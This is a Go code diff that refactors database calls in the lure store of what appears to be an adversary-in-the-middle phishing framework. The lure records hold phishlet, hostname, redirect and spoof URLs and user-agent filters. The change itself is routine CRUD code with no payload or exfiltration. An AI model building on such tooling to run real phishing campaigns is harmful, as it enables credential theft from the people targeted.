@@ -14,7 +14,7 @@ type Lures struct{ db *DB }
 func NewLureStore(db *DB) *Lures { return &Lures{db: db} }
 
 func (s *Lures) CreateLure(l *aitm.Lure) error {
-	_, err := s.db.db.Exec(`
+	_, err := s.db.Exec(`
 		INSERT INTO lures
 			(id, phishlet, hostname, path, redirect_url, spoof_url,
 			 ua_filter, paused_until, params_key)
@@ -29,7 +29,7 @@ func (s *Lures) CreateLure(l *aitm.Lure) error {
 }
 
 func (s *Lures) GetLure(id string) (*aitm.Lure, error) {
-	row := s.db.db.QueryRow(`SELECT
+	row := s.db.QueryRow(`SELECT
 		id, phishlet, hostname, path, redirect_url, spoof_url,
 		ua_filter, paused_until, params_key FROM lures WHERE id = ?`, id)
 	l, err := scanLure(row)
@@ -40,7 +40,7 @@ func (s *Lures) GetLure(id string) (*aitm.Lure, error) {
 }
 
 func (s *Lures) UpdateLure(l *aitm.Lure) error {
-	res, err := s.db.db.Exec(`
+	res, err := s.db.Exec(`
 		UPDATE lures SET
 			phishlet=?, hostname=?, path=?, redirect_url=?,
 			spoof_url=?, ua_filter=?, paused_until=?, params_key=?
@@ -56,7 +56,7 @@ func (s *Lures) UpdateLure(l *aitm.Lure) error {
 }
 
 func (s *Lures) DeleteLure(id string) error {
-	res, err := s.db.db.Exec(`DELETE FROM lures WHERE id = ?`, id)
+	res, err := s.db.Exec(`DELETE FROM lures WHERE id = ?`, id)
 	if err != nil {
 		return err
 	}
@@ -64,7 +64,7 @@ func (s *Lures) DeleteLure(id string) error {
 }
 
 func (s *Lures) ListLures() ([]*aitm.Lure, error) {
-	rows, err := s.db.db.Query(`SELECT
+	rows, err := s.db.Query(`SELECT
 		id, phishlet, hostname, path, redirect_url, spoof_url,
 		ua_filter, paused_until, params_key FROM lures ORDER BY rowid ASC`)
 	if err != nil {
